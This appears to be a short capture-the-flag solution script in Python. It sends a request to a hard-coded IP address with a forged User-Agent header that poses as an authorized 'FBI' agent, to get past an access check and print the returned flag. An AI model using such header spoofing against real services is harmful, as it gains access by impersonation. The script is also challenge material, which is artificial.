import requests

url = "http://34.135.223.176:6007"
headers = {
    'User-Agent': 'FBI-SiteAccess-Authorized-Agent'
}

resp = requests.get(f"{url}/agent-access", headers=headers)
print(resp.json()["flag"])